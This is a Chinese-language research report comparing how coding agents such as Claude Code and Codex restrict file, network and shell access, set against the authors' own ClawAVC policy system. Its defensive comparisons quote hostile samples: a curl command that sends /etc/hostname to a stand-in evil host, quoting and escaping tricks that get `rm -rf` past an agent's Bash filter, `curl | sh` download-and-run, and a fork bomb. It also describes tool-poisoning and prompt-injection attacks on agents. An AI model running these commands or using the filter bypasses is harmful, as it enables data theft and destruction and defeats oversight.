# Agent 权限策略调研报告

## ——Claude Code / Codex 等 Agent 场景下文件、网络、Bash 的角色化管控

| 项 | 内容 |
| --- | --- |
| 报告类型 | 文献调研报告（横向汇报交付物 1/3） |
| 调研日期 | 2026-10-06 |
| 调研范围 | Claude Code、OpenAI Codex、Cursor、腾讯 CodeBuddy、字节 Trae 等 Agent 产品；MCPGuard、SkillTrustBench 等评测基准；LLM Agent 安全学术文献 |
| 对照基线 | ClawAVC 现有策略库：`backend/auditor/translator/policies/{default,ops}`（**本次调研未对现有策略做任何改动**） |
| 三类核心场景 | ① 文件（读写/删改/查询范围） ② 网络请求 ③ Bash（重点：shell_exec 场景，各角色权限不同，参照 `0928.pdf`） |
| 主要参考 | `0928.pdf`（与 Claude Code 的对比实测）、Claude Code / Codex 官方文档、arXiv 论文（编号见文末参考文献） |

---

## 0. 摘要（一页结论）

1. **业界两条路线**：Claude Code 采用「**工具级规则 + 人工审批**」的策略路线（allow/ask/deny 规则、权限模式）；Codex / Cursor 采用「**OS 级沙箱 + 分级审批**」的隔离路线（macOS Seatbelt / Linux Landlock+seccomp）。前者灵活但可被命令变体绕过、依赖人工判断；后者强制但粒度粗（只有文件系统/网络两层）。
2. **ClawAVC 的差异化定位**：在 **query 发生时刻**（而非执行时刻）以「意图翻译（IR）+ 显式策略库 + 四维一致性判定」做统一访问控制——这一点与 0928.pdf 实测结论一致：Claude Code 对 `"rm" -rf`（引号混淆）只能在执行时刻靠工作目录沙箱兜底，对 Bash 内 `curl` 外发不设策略管控，读 `/etc/passwd` 仅靠人工确认。
3. **shell_exec 是业界公认最难管也最值得管的场景**：Claude Code 官方明确其 Bash 规则匹配"是尽力而为，不是强化的 shell 沙箱"；Codex 直接交给 OS 沙箱。ClawAVC 采用 **shell 语义解析**（分词阶段剥引号还原真实命令）+ **风险分级（deny_strict/warn）** + **平替引导（warn_advice.md）**，三者分别对应学术文献中的"规范化消除同义变体""策略分级""最小权限引导"。
4. **角色化（per-role）策略**：ClawAVC 的 default（普通用户）/ ops（运维）双角色策略库对应经典 RBAC 模型；业界对应物是 Claude Code 的多级配置作用域（托管策略 > CLI > 项目 > 用户）与 Codex 的 approval policy 四档。
5. **评测基准支撑**：MCPGuard（arXiv:2510.23673）确立"攻击面从代码执行扩展到**自然语言元数据的语义解释**"的范式转变；SkillTrustBench（腾讯朱雀实验室 × 港中深）的 T01–T09 九类攻击手段分类中，**T03 远程载荷下载执行、T05 越权访问与提权** 与 shell_exec 场景直接对应——T05 恰是所有现有工具的共同盲区，ClawAVC 的越权检测正是对准这个盲区。

---

## 1. ClawAVC 基线：现有策略架构（只读调研结论）

> 本节仅为对照基线，**未改动任何现有策略文件**。

- **两级注册表**：`policies/<role>/policy_registry/` 下 `scenes.json`（15 个场景：search/browser/email/…/shell_exec/file_ops 等）+ `tools/*.json`（每场景的工具函数定义、参数 `constraint_spec`、`risk` 等级）。
- **双角色**：`default`（普通用户）与 `ops`（运维）两套策略库；`policy_manager.py` 支持创建/复制/切换/重命名/删除策略库（`POLICY_NAME_RE = ^[A-Za-z0-9_-]{1,64}$`），并热重载（`reload_registry()`）。
- **约束五件套**：每个参数的 `static` 块含 `allowed_values`（命令枚举）/ `allowlist`（路径通配）/ `denylist`（精确拒绝）/ `default`（默认回填）/ `risk_guidance`（`deny_strict` 9 类硬拒绝 + `warn` 类平替引导，外链 `warn_advice.md`）。
- **三个消费通道**：① 整份 JSON 注入 Level-2 提示词引导 IR 生成；② `normalize_ir()` 默认值回填；③ `_apply_static_deny()` 静态精确拒绝（静态策略优先于 IR）。
- **判定层**：`monitor/judge.py` 四维一致性比对（Agent 实际行为 vs IR），`shell_command_semantics.py` 做 shell 语义解析（六类行为/操作符/重定向）。

---

## 2. 场景一：文件访问（读写范围、删改范围、查询范围）

### 2.1 Claude Code 的做法

**机制**（依据官方权限体系文档，2026-09 核验）：

- **规则三类**：`permissions.allow`（直接执行）/ `ask`（必询问）/ `deny`（永不执行）；评估顺序 **deny → ask → allow，首个匹配生效**，deny 不可被任何 scope 的 allow 覆盖。
- **路径规则（gitignore 风格 glob）**：`Read/Edit(//abs/path)`（前导 `//` 绝对路径）、`Edit(/src/**/*.ts)`（项目相对）、`Read(~/.zshrc)`（家目录）、`Edit(.env)`（裸文件名任意深度匹配）。
- **权限模式六种**：`default`（大多数操作前确认）、`acceptEdits`（自动批准工作目录内编辑）、`plan`（**只读探索，不编辑源文件**——只读角色的现成参照）、`dontAsk`（未显式预批准即自动拒绝）、`bypassPermissions`（跳过一切，仅限隔离环境）、`auto`（分类器模型代审）。其中 `auto`/`bypassPermissions` **不允许写入项目级 settings**（防止检出仓库自我提权）。
- **配置作用域五级**：托管策略（`/etc/claude-code/`）> 命令行参数 > `.claude/settings.local.json` > `.claude/settings.json` > `~/.claude/settings.json`；规则跨作用域**合并而非覆盖**。
- **`additionalDirectories`**：授予工作目录之外的额外可访问目录。

**局限性（0928.pdf 实测对照）**：

- 读取 `/etc/passwd` 等敏感文件：Claude Code **没有显式默认安全策略库**，仅有告警戒备，用户人工确认即放行——"安全边界完全依赖用户手动判断，人工授权操作成本高"（0928.pdf S3/4 场景）。
- 规则仅针对内置工具（Read/Edit/WebFetch），不支持对第三方插件显式配置权限——**无法检测伪装工具（恶意 MCP server）**。

### 2.2 OpenAI Codex 的做法

**机制**（官方 sandbox 文档，已迁移至 developers.openai.com/codex/security）：

- **沙箱三档**（OS 级强制，非策略规则）：
  | 能力 | `read-only`（默认） | `workspace-write` | `danger-full-access` |
  |---|---|---|---|
  | 文件读 | 允许 | 允许 | 允许 |
  | 文件写 | **全部拒绝** | 仅工作区 + `/tmp`（`writable_roots` 可追加） | 不受限 |
  | 网络 | 禁止 | 默认禁止（需显式开启） | 不受限 |
- **底层实现**：macOS 用 Apple **Seatbelt**（`sandbox-exec` 声明式 profile）；Linux 用 **Landlock**（文件系统 LSM）+ **seccomp BPF**（syscall 过滤）。
- **审批四档**（与沙箱正交）：`untrusted`（每条命令批准）/ `on-failure`（沙箱内先跑，失败再提权重跑）/ `on-request`（模型自行判断何时请求提权）/ `never`。

**特点**：文件删改范围的管控从"策略声明"下沉为"内核强制"——宁粗勿漏；读写范围与网络范围天然解耦。

### 2.3 文献与基准支撑

- **最小权限原则**：Saltzer & Schroeder（1975）[1] 在《The Protection of Information in Computer Systems》中提出包括 least privilege、complete mediation（完全中介）、fail-safe defaults（默认失败即安全）在内的 8 条设计原则——ClawAVC 的 denylist 优先（deny-wins）与 Codex 的"网络默认禁止"分别是这两条原则的现代落地。
- **RBAC**：Ferraiolo 等（2001）NIST RBAC 标准 [2]——角色-权限映射的规范化描述；ClawAVC 的 default/ops 双策略库即"每个角色一份权限集"的实例。
- **AirGapAgent**（Google，EuroS&P'25）[3]：以数据为中心的隔离防御——把"哪些数据可以被访问"做成显式访问控制，而非依赖模型自觉；与 ClawAVC 把文件路径约束写进策略库（allowlist `/workspace/**`、denylist `/etc/**`）的思路同源。
- **SkillTrustBench T05（越权访问与提权）** [4]：获取超出任务所需的文件范围/API scope 是九类攻击手段之一，且是**所有现有扫描工具的共同盲区**——根因是它们依赖"代码特征匹配"而非"意图与上下文理解"。
- **ToolEmu**（Markov 等，ICLR 2024）[5]：用 LM 仿真沙箱系统化识别 LM Agent 工具调用风险，其风险场景库中文件越权（读取敏感文件、覆盖系统文件）是第一大类。

### 2.4 对比结论（文件场景）

| 维度 | ClawAVC | Claude Code | Codex |
| --- | --- | --- | --- |
| 读范围 | allowlist（`/workspace/**`、`/tmp/**`）+ 敏感路径黑名单（`/etc/**`、`/root/**`、`~/.ssh/**`） | Read 规则 + 人工确认 | 全盘可读（read-only 档） |
| 写/删范围 | `file_actions` 区分 read/create/write/edit/delete；写范围窄于读范围（如 `write` 仅 `/workspace/outputs/**`） | Edit 规则 + acceptEdits 模式限定工作目录 | workspace-write 档内核级限定 |
| 查询范围 | `file_search` 场景单独建模（搜索范围受控） | Read/glob 规则 | read-only 档 |
| 校验时机 | **query 时**（IR 生成前注入约束） | 执行时（工具调用前） | 执行时（内核拦截） |
| 第三方工具 | MCP 工具纳入场景注册表（如 `mcpguard_notekit__*`） | 规则不覆盖第三方插件 | 沙箱覆盖一切子进程 |

---

## 3. 场景二：网络请求

### 3.1 Claude Code 的做法与边界

- **域白名单**：`WebFetch(domain:docs.anthropic.com)`、`WebFetch(domain:*.github.com)`（大小写不敏感；`*.github.com` 不匹配裸域）。**域名清单仅约束 WebFetch 工具**。
- **关键边界（0928.pdf S2 实测）**：Bash 内的 `curl http://evil.example.com/data -d @/etc/hostname` **不在管控范围**——官方文档明确该规则边界；且"只能感知 curl 和 WebFetch，其它工具产生的网络请求都不在捕获范围内"。每次网络访问需人工确认。
- ClawAVC 对照：`network` object 统一建模（IR 仅允许 `api.example.com`）→ 越权外发在翻译阶段即判"资源访问违规"。

### 3.2 Codex 的做法

- **默认断网**：`workspace-write` 档下 `network_access = false`（需在 `config.toml` 显式开启）；`read-only` 档完全禁止网络。
- **实现**：seccomp BPF 屏蔽 socket 类 syscall——**进程级断网**，无论 curl/python/任意语言发起的连接一律拦截（这与 Claude Code 的"仅感知已知工具"形成路线差异）。

### 3.3 文献与业界支撑

- **SSRF 类比**：Agent 的网络外发面与传统 SSRF 同构（内网元数据 `169.254.169.254`、localhost 服务）。ClawAVC 策略库 `search.json` 中 `http_fetch__get` 的 denylist（`http://169.254.*`、`http://metadata.*`、`http://localhost*`）即业界 SSRF 防护清单的 Agent 化。
- **数据外泄通道分类**（MCPGuard [6]、Tool Poisoning [7]）：POST 敏感文件、凭据窃取外发、环境变量泄露、持久化信标——ClawAVC 的 MCPGuard 对抗集（4 server / 17 工具）正是按此分类构造（数据外泄/凭证窃取/Env Leak/持久化信标/提示注入/响应内泄漏，见 `policies/MCPGUARD_ADAPTATION.md`）。
- **CaMeL**（Google DeepMind，2025）[8]："Defeating Prompt Injections by Design"——把能力（capability）显式化、控制流与数据流分离，未获能力的操作（含网络外发）设计上不可达。ClawAVC 的 IR 白名单本质上是 capability 列表：不在 IR 授权集内的网络对象一概违规。

### 3.4 对比结论（网络场景）

| 维度 | ClawAVC | Claude Code | Codex |
| --- | --- | --- | --- |
| 管控粒度 | **对象级**（域名/IP 白名单写入 IR） | 工具级（仅 WebFetch domain 规则） | 进程级（socket syscall 全禁或全开） |
| 覆盖面 | 全部工具（含 MCP、Bash 内 curl） | 已知内置工具 | 全部子进程 |
| 默认策略 | 白名单外拒绝（fail-safe） | 人工逐次确认 | 默认断网 |
| 变体抵抗 | IR 对象比对（与写法无关） | 无（curl 不在范围） | 强（内核级） |

---

## 4. 场景三：Bash / shell_exec（重点）

> 本场景是 0928.pdf 的核心实验对象，也是各角色（default 普通用户 / ops 运维）权限差异最大的场景。

### 4.1 Claude Code 的 Bash 管控

**机制**：

- **前缀匹配规则**：`Bash(npm run test *)`（空格+星号=前缀匹配）、`Bash(npm run build)`（精确匹配）；**空格前的 `*` 有语义**：`Bash(ls *)` 匹配 `ls -la` 不匹配 `lsof`，`Bash(ls*)` 两者皆匹配。
- **复合命令拆分**：按 `&&`、`||`、`;`、`|`、换行符拆分，**每个子命令独立匹配**——已 allow 的命令链接未 allow 的命令仍会停下。
- **包装器剥离**：`timeout`/`time`/`nice`/`nohup` 在匹配前剥离。
- **官方定位**（文档原话）："Bash 匹配是尽力而为（best-effort），**不是强化的 shell 沙箱**——不要把它当作对抗恶意提示的安全边界"，安全边界应依赖 deny 规则 + 受限环境 + PreToolUse hooks。

**实测弱点（0928.pdf，实验条件：同模型、同 query、同工具集）**：

- **S1 命令混淆**：`"rm" -rf /tmp/x`（引号包裹命令名）绕过基于字符串前缀的过滤；同类手法 `\rm`、`r\m`、变量拼接 `R=rm; $R -rf`——本质是"**同一个命令，无数种写法**"。Claude Code 的拦截来自工作目录沙箱（rm 目标不在允许目录），**不是策略产生**，要等执行发生时刻才能发现问题；"对于一些 Bash 的变体，其识别效果不佳"。
- **策略不公开**：0928.pdf 注1——"Claude Code 并不开源对 Bash 的策略，因此无法参考其策略"。

### 4.2 Codex 的 Bash 管控

- 命令在 OS 沙箱内执行（Landlock+seccomp），**写文件/联网由内核裁决**，策略层只决定"是否需要提权审批"；
- `on-failure` 审批模式是独特设计：**先自动在沙箱内跑，失败再请求提权重跑**——把"拦截"变成"降级重试"，减少审批疲劳；
- 文档同时给出 `danger-full-access` 的强警告（仅限一次性容器）。

### 4.3 腾讯 CodeBuddy / 字节 Trae（0928.pdf 进度 3 的参照系）

- **可疑命令分级**：CodeBuddy 内置安全规则将命令按风险分类（磁盘操作、网络与防火墙、系统服务、用户管理、文件删除、权限、进程控制、Git 操作、命令注入、脚本执行 **10 类**），其中重大风险直接拒绝；**可疑命令需二次确认**；
- Trae 同类配置思路：对危险度居中的命令给出警告与说明；
- **适配决策**（0928.pdf）：ClawAVC 系统不提供二次确认功能，因此"尽可能要求避免这些命令"（deny 化处理）——`shell_exec.json` 的 `risk_guidance.deny_strict` 9 类即按此基线扩充 33 项拒绝条目（`denylist` 45→71 条）。

### 4.4 ClawAVC 的 shell_exec 策略要点（现状，未改动）

- **每角色权限不同**：
  - `default`（普通用户）：`exec.command` 为 8 合 1 单对象（allowlist 并集 9 条路径、denylist 71 条、`risk` high）；`cmd_executor__exec_command` 仅允许 15 条只读查询命令；**权限收敛**导向——warn 类命令给出可替代工具引导，引导 IR 选择最小安全权限策略；
  - `ops`（运维）：保留 8 个子场景数组结构（系统信息查询/文件只读/写入删除/安装依赖/构建测试/服务管理/网络请求/危险禁止），**允许 systemctl restart/stop、服务管理类命令**——与运维角色职责对齐（0928.pdf："运维人员以其本身 query 为主体策略"）。
- **shell 语义解析**（S1 的解法）：`shell_command_semantics.analyze_shell_command` 在分词阶段剥掉引号，还原真实命令 `rm -rf /tmp/x`，推导行为「delete /tmp/x」；IR 只授权「read /tmp/project/*」→ 资源访问越界，**确定性检出（score=0.0000）**。
- **风险分级 + 平替引导**：`deny_strict`（9 类硬拒绝）/ `warn`（8 类）+ `advice_docs → warn_advice.md`（10 类 pattern/risk/alternative 结构化条目，如 `rm` → 先 `mv` 入 `/tmp/trash_<时间戳>/`；`kill` → 先 `pgrep` 定位再精确 kill）。

### 4.5 文献与业界支撑（Bash 场景）

- **命令规范化与混淆检测**：安全社区对 shell 混淆（quoting、escaping、变量拼接、base64 编码、管道注入 `| bash`）的标准防御是**语义级解析后再匹配**（而非原文匹配）——ClawAVC 的语义解析正对应此；业界对照物是 Claude Code 官方承认的"尽力而为前缀匹配"缺口。
- **下载即执行（CWE-829：包含不可信功能的远程包含）**：`curl * | sh`、`wget | sh` 在三家策略中均被禁止；SkillTrustBench **T03 远程载荷下载执行**将其升维为"审核通过后载荷可随时替换"的供应链攻击（载荷 URL 与内容解耦）[4]。
- **持久化驻留**：SkillTrustBench T06（cron/启动项/systemd service）对应 ClawAVC denylist 的 `dotfile_sync__install_cron`、`systemctl disable/mask`、`add_authorized_key` 等条目；STB 对抗集 `stb_persist` 实现为 **cron+systemd 双持久化**。
- **GuardAgent**（Xiang 等，NeurIPS 2024）[9]：用一个独立 LLM Agent 充当"守卫"，针对每次工具调用检查自然语言描述的安全策略——与 ClawAVC"翻译层 LLM 生成 IR + 判定层比对"的双层思路互为镜像（ClawAVC 把守卫的判断物化为确定性 IR 而非二次 LLM 调用，规避守卫本身被注入的问题）。
- **ToolEmu** [5]：其风险场景库中 shell 相关（RCE、管道注入、fork bomb `:(){:|:&};:`）与 ClawAVC denylist 的命令注入类逐条对应。
- **Agent Security Bench（ASB）**[10]：10 场景攻防基准，实证现有防御对间接提示注入普遍脆弱——支撑"策略必须前置于执行时刻"的设计动机。

### 4.6 对比结论（Bash 场景）

| 维度 | ClawAVC | Claude Code | Codex |
| --- | --- | --- | --- |
| 匹配层级 | **shell 语义解析**（剥引号/变量还原） | 字符串前缀 + 复合命令拆分 | 不匹配命令，只限 syscall |
| 混淆抵抗（`"rm"`/`\rm`/`$R`） | 确定性检出（还原真实命令后比对 IR） | 弱（官方承认非沙箱） | 强（内核裁决写操作） |
| 校验时机 | query 时（IR 生成阶段） | 执行时 | 执行时（内核） |
| 角色分化 | default/ops 两套 shell_exec 策略 | 配置作用域五级 | sandbox×approval 矩阵 |
| 风险分级 | deny_strict（9 类）/ warn（8 类）+ 平替文档 | ask 档（人工二次确认） | on-failure 提权重试 |
| 策略可审计性 | 策略库 JSON 完全显式、版本化 | 二进制内置（不公开） | 开源（Rust 实现） |

---

## 5. 角色化策略与"最小 agency"

- **最小权限 → 最小 agency**：OWASP 提出、Anthropic 采纳的概念——"least privilege 约束用户和系统能访问什么；**least agency 更进一步，限制每个 Agent 工具能做什么、多久一次、在哪里**" [11]。ClawAVC 的 `prompt_guidance`（每工具使用边界）+ `dynamic_ai_hint`（最小参数引导）正是 agency 收缩的工程化。
- **多级作用域 vs 多角色库**：Claude Code 用"作用域合并"（managed > CLI > project > user，deny 全局有效）；ClawAVC 用"整库切换"（`switch_policy`，config 表 `current_policy` + 模板路径 `{policy}`）。前者适合单用户多项目，后者适合多角色共设备（普通用户/运维）。
- **0928.pdf 的规划印证**：Bash 可替代工具引导"计划后续配合【普通用户】角色进行配置；运维人员以其本身 query 为主体策略"——即 default 库走"最小权限提示 + 平替引导"、ops 库走"职责内放行"的双轨。

---

## 6. 综合对比与定位

| 对比项 | ClawAVC | Claude Code | Codex / Cursor |
| --- | --- | --- | --- |
| 控制模型 | IR 白名单 + 显式策略库（声明式，机器可校验） | 工具级规则 + 人工审批 | OS 沙箱（强制式） |
| 控制点 | **query → IR 翻译时前置约束** | 工具调用执行时 | 进程/syscall 执行时 |
| 透明度 | 策略库开源、JSON 可 diff、热重载 | 规则语法公开、内置清单不公开 | 完全开源 |
| 变体混淆抵抗 | 语义解析 + 四维判定 | 弱 | 强（但粒度粗） |
| 人工介入 | 策略库预授权，免逐次确认 | 逐次确认（成本高） | 审批四档 |
| 第三方/恶意工具 | 场景注册表 + 双层描述打标（MCPGuard 对抗集） | 不覆盖 | 沙箱覆盖但无法"识别恶意" |
| 角色 | default / ops（可扩展新角色） | 六种模式（横向） | 三沙箱 × 四审批（矩阵） |

**一句话定位**：Claude Code 代表"策略在提示与审批层"，Codex/Cursor 代表"策略在内核层"，ClawAVC 代表"策略在**意图翻译层**"——把权限在 query 时刻物化为可判定的 IR，兼顾了 Claude Code 的语义理解优势与 OS 沙箱的确定性，并以角色化策略库覆盖差异化权限需求。

---

## 7. 对后续工作的启示（仅建议，不落地改动）

1. **新角色扩展**（对应交付物 2 的 Skill）：业界对照物支持从现有 default/ops 库派生新角色（如"只读分析师"= Claude Code plan 模式 + Codex read-only 档的组合语义）。
2. **denylist 模式匹配升级**：当前 `denylist` 为精确匹配（`pval in denylist`），模式类条目（`dd of=/dev/*`、`curl * | sh`）只作 AI 引导；业界（Claude Code 前缀语法、glob）与文献（规范化后匹配）均支持升级为前缀/glob 匹配（需改 core.py，另行评审——与现有《shell_exec_策略调整说明.md》R1 风险项一致）。
3. **端到端评测**（对应交付物 3）：MCPGuard 82 条 query（4 server/17 工具）与 SkillTrustBench 30 条 query（5 server/10 工具，T01–T09）已具备落地件，可补齐"检出率/误报率"两类准确率度量（SkillTrustBench 首期评测经验：FNR + 逐类召回 + suspicious/malicious 区分度是关键指标）。
4. **AGENTS.md 维护**：0928.pdf 提出 warn 建议后续加载入 AGENTS.md 统一维护——与 Claude Code CLAUDE.md / Codex AGENTS.md 的项目级安全约定实践一致。

---

## 8. 参考文献

**经典与标准**

- [1] J. H. Saltzer, M. D. Schroeder. *The Protection of Information in Computer Systems*. Proceedings of the IEEE, 63(9), 1975.（最小权限、完全中介、失败即安全等 8 原则）
- [2] D. F. Ferraiolo, R. Sandhu, S. Gavrila, D. R. Kuhn. *Proposed NIST Standard for Role-Based Access Control*. ACM TISSEC 4(3), 2001.
- [3] Google. *AirGapAgent: Protecting Privacy-Conscious Conversational Agents*. IEEE EuroS&P, 2025.（数据为中心的隔离防御）

**学术前沿（arXiv）**

- [4] 腾讯朱雀实验室 × 香港中文大学（深圳）. *SkillTrustBench*. 2026.（首个 Agent 技能安全评测基准：62,652 个真实 Skill → 5,520 用例；T01–T09 九类攻击手段；官网 matrix.tencent.com/skilltrustbench；数据集 cuhk-zhuque/SkillTrustBench @ HuggingFace）
- [5] Z. Markov et al. *Identifying the Risks of LM Agents with an LM-Emulated Sandbox (ToolEmu)*. arXiv:2309.15817, ICLR 2024.
- [6] B. Wang, Z. Liu, H. Yu, et al. *MCPGuard: Automatically Detecting Vulnerabilities in MCP Servers*. arXiv:2510.23673, 2025.（MCP 安全是"从代码执行到自然语言元数据语义解释"的范式转变）
- [7] Invariant Labs. *Tool Poisoning Attacks on MCP*. 2025.（工具描述隐藏指令、Rug Pull、跨服务器工具影子化、Sampling 攻击）
- [8] E. Debenedetti et al. (Google DeepMind). *Defeating Prompt Injections by Design (CaMeL)*. arXiv:2503.18813, 2025.
- [9] Z. Xiang et al. *GuardAgent: Safeguard LLM Agents by an Agent*. arXiv:2406.09187, NeurIPS 2024.
- [10] T. Zhang et al. *Agent Security Bench (ASB): Formalizing and Benchmarking Attacks and Defenses in LLM-based Agents*. arXiv:2410.02644, 2024.（10 场景、10 攻击类别、436 交互环境；相关：InjecAgent, arXiv:2403.02691；AgentDojo, arXiv:2406.13352）

**官方文档（检索于 2026-10）**

- [11] Anthropic. *Claude Code 文档：Settings / Permissions / Permission Modes / Hooks*. code.claude.com/docs（中文解析参考：developersdigest.tech《Claude Code Permissions: settings.json Allow, Deny, Ask》，2026-09-28 对照官方核验）
- [12] OpenAI. *Codex Sandbox & Approvals*. github.com/openai/codex docs/sandbox.md → developers.openai.com/codex/security（Seatbelt / Landlock+seccomp / 三档沙箱 / 四档审批）
- [13] Cursor. *Agent Sandboxing*（macOS Seatbelt、Linux Landlock+seccomp、Windows 隔离环境；业界多篇拆解文章交叉印证）

**内部资料**

- [14] `0928.pdf`：进度 2（与 Claude Code 的设计对比：S1 命令混淆 / S2 网络越权外发 / S3-4 文件读取）+ 进度 3（Bash 限制与最小化权限提示优化，参照 CodeBuddy/Trae）。
- [15] `backend/auditor/translator/policies/MCPGUARD_ADAPTATION.md`、`default/policy_registry/tools/shell_exec_策略调整说明.md`、`tools/warn_advice.md`（现状策略文档）。

---

*本报告为只读调研产出，未修改 `backend/auditor/translator/policies/` 下任何现有策略文件。*
